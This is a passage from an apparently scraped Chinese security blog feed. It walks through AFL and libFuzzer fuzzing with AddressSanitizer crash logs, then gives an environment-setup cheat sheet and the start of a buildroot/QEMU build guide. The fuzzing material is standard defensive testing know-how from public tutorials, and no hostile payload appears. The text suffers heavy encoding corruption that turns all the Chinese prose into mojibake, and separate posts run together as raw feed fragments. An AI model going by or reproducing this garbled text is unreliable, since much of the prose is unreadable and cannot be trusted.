(/f/lab/fuzzing_baby/vulner+0x4393ca) in printf_common(void*, char const*, __va_list_tag*) Shadow bytes around the buggy address: 0x100052119c50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119c90: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1 =\u0026gt;0x100052119ca0: 00 00 00 00 00 00 00 00 00 00 00 00[04]f3 f3 f3 0x100052119cb0: f3 f3 f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119ce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x100052119cf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==1541245==ABORTING ç”±æ­¤å¾—åˆ°äº†crashçš„è¯¦ç»†ä¿¡æ¯è¾“å‡ºã€‚\né»‘ç›’æµ‹è¯•QEMU modeâ€”â€”æ‹†èµ°æºç ã®è½®å„¿ AFLçš„QEMU modeä¸ä¼šé»˜è®¤å®‰è£…ï¼Œè€Œæ˜¯éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å®‰è£…ï¼š\n1 2 3 4 5 sudo apt install libtool libtool-bin libcapstone-dev cd AFL/qemu_mode ./build_qemu_support.sh cd .. sudo make install å¦‚æœé‡åˆ°ç¼–è¯‘é”™è¯¯ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä»½forkï¼šhttps://github.com/blurbdust/AFL.git\nä¸æ’æ¡©é‡æ–°ç¼–è¯‘ç¨‹åºï¼š\n1 gcc vulner.c -o vulner å¼€å§‹QEMU modeé»‘ç›’fuzzing\n1 afl-fuzz -Q -i fuzz_in -o fuzz_out ./vulner AFLå¹¶å‘â€”â€”å­¦æ­¥è½¦çš„å››ç¼¸å¼•æ“ é€šè¿‡-MæŒ‡å®šmaster fuzzerè¿›ç¨‹ï¼Œ-SæŒ‡å®šä¸€ç³»åˆ—slave fuzzerè¿›ç¨‹å³å¯ã€‚å››æ ¸æœºå™¨å°±ï¼š\n1 2 3 4 afl-fuzz -i fuzz_in -o fuzz_out -M fuzzer1 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer2 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer3 ./vulner afl-fuzz -i fuzz_in -o fuzz_out -S fuzzer4 ./vulner Fuzzing capstone using AFL persistent mode Refï¼šhttps://toastedcornflakes.github.io/articles/fuzzing_capstone_with_afl.html\nè·å–å—å®³è€…capstoneï¼š\n1 git clone https://github.com/capstone-engine/capstone.git \\x02 libFuzzeråˆæ¢ ç¯å¢ƒå‡†å¤‡ LibFuzzer is an in-process, coverage-guided, evolutionary fuzzing engine.\nå®˜æ–¹æ–‡æ¡£ Googleçš„libFuzzeræ•™ç¨‹ â˜ï¸æ¥ä¸‹æ¥è¯»ä¸€ç»ƒäºŒ\nå°†æ•™ç¨‹ä»“åº“cloneä¸‹æ¥ï¼š\n1 git clone https://github.com/google/fuzzing.git fuzzing ç”±äºï¼š\nRecent versions of Clang (starting from 6.0) include libFuzzer, and no extra installation is necessary.\næ‰€ä»¥å¯ä»¥ç›´æ¥æµ‹è¯•ä¸€ä¸‹ç¯å¢ƒæ˜¯å¦å°±ç»ªï¼š\n1 2 clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc ./a.out 2\u0026gt;\u0026amp;1 | grep ERROR æˆ‘å¾—åˆ°äº†ï¼š\n1 ==2118349==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200003d473 at pc 0x000000550453 bp 0x7fff521da530 sp 0x7fff521da528 çœ‹æ¥æ²¡é—®é¢˜ï¼Œç»§ç»­å‰è¿›ã€‚\nç«èŠ±å¡æ‰“ç«â€”â€”demoæ‹†è§£ æ ·ä¾‹ç¨‹åºå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; bool FuzzMe(const uint8_t *Data, size_t DataSize) { return DataSize \u0026gt;= 3 \u0026amp;\u0026amp; Data[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; Data[1] == \u0026#39;U\u0026#39; \u0026amp;\u0026amp; Data[2] == \u0026#39;Z\u0026#39; \u0026amp;\u0026amp; Data[3] == \u0026#39;Z\u0026#39;; // :â€‘\u0026lt; } extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { FuzzMe(Data, Size); return 0; } ä½¿ç”¨libFuzzeræ—¶æˆ‘ä»¬çš„Fuzzç›®æ ‡æ˜¯ï¼Ÿ\nDefinition: a fuzz target is a function that has the following signature and does something interesting with it\u0026rsquo;s arguments:\n1 2 3 4 extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { DoSomethingWithData(Data, Size); return 0; } æ‰€ä»¥å¯¹äºæ ·ä¾‹ç¨‹åºï¼Œæˆ‘ä»¬å…ˆå‡†å¤‡å¥½å¾…æµ‹å‡½æ•°ï¼š\n1 2 3 4 5 6 7 bool FuzzMe(const uint8_t *Data, size_t DataSize) { return DataSize \u0026gt;= 3 \u0026amp;\u0026amp; Data[0] == \u0026#39;F\u0026#39; \u0026amp;\u0026amp; Data[1] == \u0026#39;U\u0026#39; \u0026amp;\u0026amp; Data[2] == \u0026#39;Z\u0026#39; \u0026amp;\u0026amp; Data[3] == \u0026#39;Z\u0026#39;; // :â€‘\u0026lt; } åœ¨ä¸ºå…¶å‡†å¤‡fuzz wrapperå‡½æ•°ï¼š\n1 2 3 4 extern \u0026#34;C\u0026#34; int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) { FuzzMe(Data, Size); return 0; } ä½¿ç”¨ç‰ˆæœ¬6ä»¥ä¸Šçš„clangï¼Œå¼€å¯å¦‚ä¸‹ä¸‰ä¸ªé€‰é¡¹è¿›è¡Œç¼–è¯‘ï¼š\n-fsanitize=fuzzer (required): provides in-process coverage information to libFuzzer and links with the libFuzzer runtime. -fsanitize=address (recommended): enables AddressSanitizer -g (recommended): enables debug info, makes the error messages easier to read. 1 clang++ -g -fsanitize=address,fuzzer fuzzing/tutorial/libFuzzer/fuzz_me.cc è¿è¡Œç¼–è¯‘å‡ºçš„ç¨‹åºï¼Œå³è¾“å‡ºäº†ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 âœ fuzzing git:(master) âœ— ./a.out INFO: Seed: 122504861 INFO: Loaded 1 modules (7 inline 8-bit counters): 7 [0x5a6eb0, 0x5a6eb7), INFO: Loaded 1 PC tables (7 PCs): 7 [0x56b140,0x56b1b0), INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus #2 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 27Mb #3 NEW cov: 4 ft: 4 corp: 2/5b lim: 4 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 CrossOver- #13 REDUCE cov: 4 ft: 4 corp: 2/4b lim: 4 exec/s: 0 rss: 27Mb L: 3/3 MS: 5 ChangeBit-ShuffleBytes-ChangeByte-CrossOver-CrossOver- #446 REDUCE cov: 5 ft: 5 corp: 3/7b lim: 8 exec/s: 0 rss: 27Mb L: 3/3 MS: 3 ChangeByte-CopyPart-CMP- DE: \u0026#34;F\\x00\u0026#34;- #4543 NEW cov: 6 ft: 6 corp: 4/11b lim: 48 exec/s: 0 rss: 27Mb L: 4/4 MS: 2 InsertByte-ChangeByte- #4880 REDUCE cov: 6 ft: 6 corp: 4/10b lim: 48 exec/s: 0 rss: 27Mb L: 3/3 MS: 2 ChangeByte-EraseBytes- #7716 REDUCE cov: 7 ft: 7 corp: 5/14b lim: 74 exec/s: 0 rss: 27Mb L: 4/4 MS: 1 InsertByte- ================================================================= ==2119678==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6020000303f3 at pc 0x000000550453 bp 0x7fffcad0db90 sp 0x7fffcad0db88 READ of size 1 at 0x6020000303f3 thread T0 #0 0x550452 in FuzzMe(unsigned char const*, unsigned long) /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:9:7 #1 0x5504f4 in LLVMFuzzerTestOneInput /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:13:3 #2 0x458671 in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long) (/f/lab/fuzzing_baby/fuzzing/a.out+0x458671) #3 0x457db5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/fuzzing/a.out+0x457db5) #4 0x45a057 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/fuzzing/a.out+0x45a057) #5 0x45ad55 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/fuzzing/ a.out+0x45ad55) #6 0x44970e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/fuzzing/a.out+0x44970e) #7 0x472552 in main (/f/lab/fuzzing_baby/fuzzing/a.out+0x472552) #8 0x7f9d13710082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 #9 0x41e4ad in _start (/f/lab/fuzzing_baby/fuzzing/a.out+0x41e4ad) 0x6020000303f3 is located 0 bytes to the right of 3-byte region [0x6020000303f0,0x6020000303f3) allocated by thread T0 here: #0 0x51e1dd in malloc (/f/lab/fuzzing_baby/fuzzing/a.out+0x51e1dd) #1 0x432897 in operator new(unsigned long) (/f/lab/fuzzing_baby/fuzzing/a.out+0x432897) #2 0x457db5 in fuzzer::Fuzzer::RunOne(unsigned char const*, unsigned long, bool, fuzzer::InputInfo*, bool*) (/f/lab/fuzzing_baby/fuzzing/a.out+0x457db5) #3 0x45a057 in fuzzer::Fuzzer::MutateAndTestOne() (/f/lab/fuzzing_baby/fuzzing/a.out+0x45a057) #4 0x45ad55 in fuzzer::Fuzzer::Loop(std::__Fuzzer::vector\u0026lt;fuzzer::SizedFile, fuzzer::fuzzer_allocator\u0026lt;fuzzer::SizedFile\u0026gt; \u0026gt;\u0026amp;) (/f/lab/fuzzing_baby/fuzzing/ a.out+0x45ad55) #5 0x44970e in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long)) (/f/lab/fuzzing_baby/fuzzing/a.out+0x44970e) #6 0x472552 in main (/f/lab/fuzzing_baby/fuzzing/a.out+0x472552) #7 0x7f9d13710082 in __libc_start_main /build/glibc-SzIz7B/glibc-2.31/csu/../csu/libc-start.c:308:16 SUMMARY: AddressSanitizer: heap-buffer-overflow /root/lab/fuzzing_baby/fuzzing/tutorial/libFuzzer/fuzz_me.cc:9:7 in FuzzMe(unsigned char const*, unsigned long ) Shadow bytes around the buggy address: 0x0c047fffe020: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe030: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe040: fa fa fd fa fa fa fd fd fa fa fd fa fa fa fd fa 0x0c047fffe050: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa 0x0c047fffe060: fa fa fd fa fa fa fd fa fa fa fd fa fa fa fd fa =\u0026gt;0x0c047fffe070: fa fa fd fd fa fa fd fd fa fa fd fa fa fa[03]fa 0x0c047fffe080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c047fffe0c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==2119678==ABORTING MS: 1 EraseBytes-; base unit: 9a96b9fc7e2f4543fde6948573fd8bb47ec80fd0 0x46,0x55,0x5a, FUZ artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60 åŒæ—¶ç”Ÿæˆäº†è§¦å‘å¦‚ä¸Šcrashçš„è¾“å…¥crash-0eb8e4ed029b774d80f2b66408203801cb982a60ï¼Œå†…å®¹ä¸ºï¼š\n1 2 3 âœ fuzzing git:(master) âœ— hd crash-0eb8e4ed029b774d80f2b66408203801cb982a60 00000000 46 55 5a |FUZ| 00000003 ä½¿ç”¨å…¶å¤ç°æ¼æ´ï¼š\n1 ./a.out \u0026lt; crash-0eb8e4ed029b774d80f2b66408203801cb982a60 ç”±æ­¤ä¾¿æ˜¯å€ŸåŠ©libFuzzerå®Œæˆçš„æœ€ç®€å•çš„Fuzzingä¸æ‰¾åˆ°çš„æ¼æ´ã€‚\nä¸‹èµ›é“åçš„å¤ç›˜â€”â€”fuzzingè¾“å‡ºè§£æ 1 INFO: Seed: 3918206239 The fuzzer has started with this random seed. Rerun it with -seed=3918206239 to get the same result.\n1 2 INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes INFO: A corpus is not provided, starting from an empty corpus By default, libFuzzer assumes that all inputs are 4096 bytes or smaller. To change that either use -max_len=N or run with a non-empty seed corpus.\n1 2 3 4 5 6 #0 READ units: 1 #1 INITED cov: 3 ft: 3 corp: 1/1b exec/s: 0 rss: 26Mb #8 NEW cov: 4 ft: 4 corp: 2/29b exec/s: 0 rss: 26Mb L: 28 MS: 2 InsertByte-InsertRepeatedBytes- #3405 NEW cov: 5 ft: 5 corp: 3/82b exec/s: 0 rss: 27Mb L: 53 MS: 4 InsertByte-EraseBytes-... #8664 NEW cov: 6 ft: 6 corp: 4/141b exec/s: 0 rss: 27Mb L: 59 MS: 3 CrossOver-EraseBytes-... #272167 NEW cov: 7 ft: 7 corp: 5/201b exec/s: 0 rss: 51Mb L: 60 MS: 1 InsertByte- libFuzzer has tried at least 272167 inputs (#272167) and has discovered 5 inputs of 201 bytes total (corp: 5/201b) that together cover 7 coverage points (cov: 7). You may think of coverage points as of basic blocks in the code.\n1 2 3 4 ==2335==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000155c13 at pc 0x0000004ee637... READ of size 1 at 0x602000155c13 thread T0 #0 0x4ee636 in FuzzMe(unsigned char const*, unsigned long) fuzzing/tutorial/libFuzzer/fuzz_me.cc:10:7 #1 0x4ee6aa in LLVMFuzzerTestOneInput fuzzing/tutorial/libFuzzer/fuzz_me.cc:14:3 On one of the inputs AddressSanitizer has detected a heap-buffer-overflow bug and aborted the execution.\n1 artifact_prefix=\u0026#39;./\u0026#39;; Test unit written to ./crash-0eb8e4ed029b774d80f2b66408203801cb982a60 Before exiting the process libFuzzer has created a file on disc with the bytes that triggered the crash.\né©¾æ ¡å®ä¹ â€”â€”CVE-2014-0160 è§CVE-2014-0160åˆ†æ\nç§å­è¯­æ–™åº“ ä½¿ç”¨è°·æ­Œçš„æ•™ç¨‹ä»“åº“å®éªŒï¼š\n1 2 3 git clone https://github.com/google/fuzzer-test-suite.git mkdir woff; cd woff; ../fuzzer-test-suite/woff2-2016-05-06/build.sh å¼€å§‹è¿è¡Œfuzzerï¼š\n1 ./woff2-2016-05-06-fsanitize_fuzzer Most likely you will see that the fuzzer is stuck \u0026ndash; it is running millions of inputs but can not find many new code paths.\n1 2 3 4 5 6 7 8 #1 INITED cov: 18 ft: 15 corp: 1/1b exec/s: 0 rss: 27Mb #15 NEW cov: 23 ft: 16 corp: 2/5b exec/s: 0 rss: 27Mb L: 4 MS: 4 InsertByte-... #262144 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 131072 rss: 45Mb #524288 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 131072 rss: 62Mb #1048576 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 116508 rss: 97Mb #2097152 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 110376 rss: 167Mb #4194304 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 107546 rss: 306Mb #8388608 pulse cov: 23 ft: 16 corp: 2/5b exec/s: 106184 rss: 584Mb The first step you should make in such case is to find some inputs that trigger enough code paths \u0026ndash; the more the better. The woff2 fuzz target consumes web fonts in .woff2 format and so you can just find any such file(s). The build script you have just executed has downloaded a project with some .woff2 files and placed it into the directory ./seeds/. Inspect this directory. What do you see? Are there any .woff2 files?\nNow you can use the woff2 fuzzer with a seed corpus. Do it like this:\n1 2 mkdir MY_CORPUS ./woff2-2016-05-06-fsanitize_fuzzer MY_CORPUS/ seeds/ When a libFuzzer-based fuzzer is executed with one more directory as arguments, it will first read files from every directory recursively and execute the target function on all of them. Then, any input that triggers interesting code path(s) will be written back into the first corpus directory (in this case, MY_CORPUS).\nLet us look at the output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 INFO: Seed: 3976665814 INFO: Loaded 1 modules (9611 inline 8-bit counters): 9611 [0x93c710, 0x93ec9b), INFO: Loaded 1 PC tables (9611 PCs): 9611 [0x6e8628,0x70ded8), INFO: 0 files found in MY_CORPUS/ INFO: 62 files found in seeds/ INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 168276 bytes INFO: seed corpus: files: 62 min: 14b max: 168276b total: 3896056b rss: 37Mb #63 INITED cov: 632 ft: 1096 corp: 13/766Kb exec/s: 0 rss: 61Mb NEW_FUNC[0/1]: 0x5aae80 in TransformDictionaryWord... #64 NEW cov: 651 ft: 1148 corp: 14/832Kb exec/s: 0 rss: 63Mb L: 67832/68784 MS: 1 ChangeBinInt- ... #535 NEW cov: 705 ft: 1620 corp: 48/3038Kb exec/s: 0 rss: 162Mb L: 68784/68784 MS: 1 ChangeBinInt- ... #288595 NEW cov: 839 ft: 2909 corp: 489/30Mb exec/s: 1873 rss: 488Mb L: 62832/68784 MS: 1 ShuffleBytes- ... As you can see, the initial coverage is much greater than before (INITED cov: 632) and it keeps growing.\nThe size of the inputs that libFuzzer tries is now limited by 168276, which is the size of the largest file in the seed corpus. You may change that with -max_len=N.\nYou may interrupt the fuzzer at any moment and restart it using the same command line. It will start from where it stopped.\n","date":"2022-05-11T13:57:01+08:00","image":"https://lcamtuf.coredump.cx/afl/afl_screen.png","permalink":"https://cerr.cc/post/zkv%E7%9A%84fuzzing%E6%97%A9%E6%95%99/","title":"ZKVçš„Fuzzingæ—©æ•™"},{"content":" ä½œä¸ºä¸€ä¸ªç³»ç»Ÿé‡è£…çˆ±å¥½è€…å’Œç¡¬ä»¶æ”¶é›†æ‹¾è’äººï¼Œä¸ºäº†å‡å°‘åœ¨ç¯å¢ƒé…ç½®ä¸Šæµªè´¹çš„ç”Ÿå‘½ï¼Œè®°å½•å¸¸ç”¨ç¯å¢ƒé…ç½®å‘½ä»¤ç”¨ä»¥ç›´æ¥å¤åˆ¶ç²˜è´´\nä¸ªäºº apt æº Linux åˆå§‹ç¯å¢ƒè½¯ä»¶å®‰è£… åŸºæœ¬ç»„ä»¶ 1 2 3 4 sudo apt install zsh git man man-db manpages ssh neovim tmux \\ curl wget netcat net-tools nmap tcpdump figlet bat \\ binutils xxd strace libncurses5-dev traceroute network-manager \\ neofetch zip unzip ncdu htop dosfstools nyancat cmatrix å¼€å‘ä¸è°ƒè¯•ç»„ä»¶ 1 2 sudo apt install gcc g++ gdb gdb-multiarch gdbserver flex bison make cmake clangd \\ python3 ipython3 python-is-python3 python3-pip build-essential ninja-build dotfiles å¿«é€Ÿå°±ä½ 1 2 3 4 5 6 7 8 git clone https://github.com/dev2ero/dotfiles.git sh -c \u0026#34;$(curl -fsSL https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh)\u0026#34; git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting mkdir -p ~/.config/nvim/ cp `pwd`/dotfiles/init.lua ~/.config/nvim/init.lua cp `pwd`/dotfiles/zshrc ~/.zshrc source ~/.zshrc Neovim é…ç½® æ’ä»¶ç®¡ç†å™¨ 1 2 3 4 5 6 7 8 9 10 # vim-plug sh -c \u0026#39;curl -fLo \u0026#34;${XDG_DATA_HOME:-$HOME/.local/share}\u0026#34;/nvim/site/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\u0026#39; # packer.vim git clone --depth 1 https://github.com/wbthomason/packer.nvim ~/.local/share/nvim/site/pack/packer/start/packer.nvim mkdir -p ~/.config/nvim/lua/ cat \u0026gt;\u0026gt; ~/.config/nvim/lua/plugins.lua \u0026lt;\u0026lt; EOF return require(\u0026#39;packer\u0026#39;).startup(function() use \u0026#39;wbthomason/packer.nvim\u0026#39; end) EOF Coc.nvim 1 CocInstall coc-marketplace | CocInstall coc-clangd | CocInstall coc-pyright | CocInstall coc-highlight | CocInstall coc-cmake docker å®‰è£… å®˜æ–¹å®‰è£…è„šæœ¬ï¼š\n1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun æ‹‰å–ç‰¹å®šé•œåƒå¹¶è®¾å®šå…±äº«æ–‡ä»¶å¤¹ï¼š\n1 sudo docker run -it -v /home/zkv/docker_share/:/share ubuntu:16.04 pwn ç¯å¢ƒç®€æ˜“å°±ä½ 1 2 3 4 apt install gdb gdb-multiarch gdbserver git clone https://github.com/pwndbg/pwndbg; cd pwndbg; ./setup.sh echo -n \u0026#34;set syntax-highlight-style tango\u0026#34; \u0026gt;\u0026gt; ~/.gdbinit pip install some-package -i https://pypi.tuna.tsinghua.edu.cn/simple ","date":"2022-05-10T21:13:54+08:00","image":"https://s2.loli.net/2022/05/11/7aWbNEkesXlmYxH.jpg","permalink":"https://cerr.cc/post/%E4%B8%80%E4%BA%9B%E9%85%8D%E7%8E%AF%E5%A2%83%E7%9A%84cheasheet/","title":"ä¸€äº›é…ç¯å¢ƒçš„Cheasheet"},{"content":"è‡ªåŠ¨æŒ¡ ä¸€è·¯é»˜è®¤ é€šè¿‡gitæˆ–httpè·å–buildrootï¼š\nå®˜ç½‘ï¼šhttps://buildroot.org/\ngitï¼šgit clone https://git.buildroot.net/buildroot\nè¿›å…¥buildrootæ ¹ç›®å½•ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå«configsçš„æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­è®°å½•äº†è®¸å¤šç¡¬ä»¶å¹³å°å’Œéƒ¨åˆ†qemuè™šæ‹Ÿå¹³å°çš„é»˜è®¤é…ç½®å‚æ•°ã€‚æ‰§è¡Œ ls configs | grep qemuï¼Œå¯ä»¥çœ‹åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 qemu_aarch64_sbsa_defconfig qemu_aarch64_virt_defconfig qemu_arm_versatile_defconfig qemu_arm_versatile_nommu_defconfig qemu_arm_vexpress_defconfig qemu_arm_vexpress_tz_defconfig qemu_m68k_mcf5208_defconfig qemu_m68k_q800_defconfig qemu_microblazebe_mmu_defconfig qemu_microblazeel_mmu_defconfig qemu_mips32r2el_malta_defconfig qemu_mips32r2_malta_defconfig qemu_mips32r6el_malta_defconfig qemu_mips32r6_malta_defconfig qemu_mips64el_malta_defconfig qemu_mips64_malta_defconfig qemu_mips64r6el_malta_defconfig qemu_mips64r6_malta_defconfig qemu_nios2_10m50_defconfig qemu_or1k_defconfig qemu_ppc64_e5500_defconfig qemu_ppc64le_powernv8_defconfig qemu_ppc64le_pseries_defconfig qemu_ppc64_pseries_defconfig qemu_ppc_bamboo_defconfig qemu_ppc_e500mc_defconfig qemu_ppc_g3beige_defconfig qemu_ppc_mac99_defconfig qemu_ppc_mpc8544ds_defconfig qemu_riscv32_virt_defconfig qemu_riscv64_virt_defconfig qemu_s390x_defconfig qemu_sh4eb_r2d_defconfig qemu_sh4_r2d_defconfig qemu_sparc64_sun4u_defconfig qemu_sparc_ss10_defconfig qemu_x86_64_defconfig qemu_x86_defconfig qemu_xtensa_lx60_defconfig qemu_xtensa_lx60_nommu_defconfig ä¸¾ä¾‹æ¥è®²ï¼Œæˆ‘ä»¬ä½¿ç”¨ make qemu_arm_vexpress_defconfigï¼Œå°†qemuæ¨¡æ‹Ÿçš„vexpersså¹³å°è®¾ä¸ºç¼–è¯‘ç›®æ ‡ï¼š\n1 2 make qemu_arm_vexpress_defconfig make æˆ–è€…ä½¿ç”¨ make menuconfig æ‰‹åŠ¨é…ç½®ã€‚\nç­‰å¾…ç¼–è¯‘å®Œæˆï¼Œå³å¯åœ¨outputæ–‡ä»¶å¤¹ä¸­æ‹¿åˆ°ç›¸åº”ç›®æ ‡æ–‡ä»¶ï¼š\n1 2 3 output/images/zImage # å†…æ ¸ output/images/rootfs.ext2 # ext2æ ¹æ–‡ä»¶ç³»ç»Ÿé•œåƒ output/images/vexpress-v2p-ca9.dtb # armè®¾å¤‡æ ‘ ä½¿ç”¨qemu-system-armè¿è¡Œå¾—åˆ°çš„linuxï¼š\n1 2 3 4 5 6 7 8 9 10 qemu-system-arm \\ -M vexpress-a9 \\ -smp 1 \\ -m 256 \\ -kernel output/images/zImage \\ -dtb output/images/vexpress-v2p-ca9.dtb \\ -drive file=output/images/rootfs.ext2,if=sd,format=raw \\ -append \u0026#34;console=ttyAMA0,115200 root=/dev/mmcblk0\u0026#34; \\ -serial stdio \\ -nographic å¼„å®Œå‘ç°è¿‡ç¨‹ç«Ÿå¦‚æ­¤ç®€å•ï¼ŒbuildrootæŠŠæ‰€æœ‰æ´»éƒ½å¹²äº†â€¦â€¦\nå…¨è‡ªåŠ¨æ–¹æ¡ˆä¸­çš„å®šåˆ¶ å³ä½¿éœ€è¦å®šåˆ¶éƒ¨åˆ†ç»„ä»¶ï¼Œä¹Ÿæ˜¯èƒ½å€ŸåŠ›buildrootçš„å…¨è‡ªåŠ¨åŒ–æ–¹æ¡ˆçš„ã€‚\nå…ˆå¯¼å…¥è‡ªå·±éœ€è¦çš„å…¨è‡ªåŠ¨æ–¹æ¡ˆçš„é»˜è®¤é…ç½®ï¼Œå†ä½¿ç”¨make menuconfigå¯¹å…¶ç”Ÿæˆçš„.configè¿›è¡Œå®šåˆ¶ï¼š\n1 2 make qemu_aarch64_virt_defconfig make menuconfig ä¸¾ä¾‹æ¥è¯´ï¼Œå¦‚æœæˆ‘çš„éœ€æ±‚æ˜¯ä½¿ç”¨ç¬¬ä¸‰æ–¹å†…æ ¸ï¼Œåˆ™ä¿®æ”¹ï¼š\n1 2 Kernel ---\u0026gt; Kernel version (Custom Git repository) è®°ä¸€æ¬¡æ—§ç‰ˆæœ¬å·¥å…·é“¾çš„è‡ªåŠ¨æŒ¡æ„å»º è¿™ä¸€èŠ‚å®é™…ä¸Šç”±å¦ä¸€ç¯‡æ–‡ç« åˆå¹¶è€Œæ¥ï¼Œæ•…ä¸ä¸Šä¸‹æ–‡ä¸è¡”æ¥ï¼Œå†…å®¹ç‹¬ç«‹ã€‚\næ„å»ºè¿™ä¸€æ­¥ï¼Œèƒ½ç”¨å¥½buildrootçš„è¯åŸºæœ¬å°±æ²¡æœ‰å¤šå°‘éœ€è¦æ‰‹åŠ¨é…ç½®çš„æ­¥éª¤äº†ã€‚\næ„å»ºç‰¹å®šçš„ç›®æ ‡å‰ï¼Œæˆ‘ä»¬è¦ç¡®å®šå¥½å„ç§å‚æ•°ï¼šæŒ‡ä»¤é›†æ¶æ„ã€å·¥å…·é“¾ã€é“¾æ¥åº“â€¦â€¦è¿™å½“ç„¶éƒ½æ˜¯å¯ä»¥ç»ç”±make 